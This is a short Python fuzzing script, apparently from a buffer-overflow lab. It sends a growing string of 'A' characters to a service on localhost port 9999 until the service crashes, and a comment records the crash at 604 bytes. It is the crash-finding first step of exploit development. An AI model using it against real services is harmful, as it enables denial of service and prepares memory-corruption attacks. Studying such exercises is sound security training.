import socket
import sys
from time import sleep

#s = socket.socket()
ip="127.0.0.1"
port=9999
counter=0

while True:
   try:
       buffer="A"*50
       counter=counter+1
       buffer=buffer*counter+"\r\n\r\n"
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       s.connect((ip,port))
       print(buffer)
       s.send(buffer)
       sleep(3)
       s.close()
   except:
       print("crashed at :"+str(len(buffer)))
       sys.exit()
       
       
############################################# Result crashed after, 604 Bytes ########################
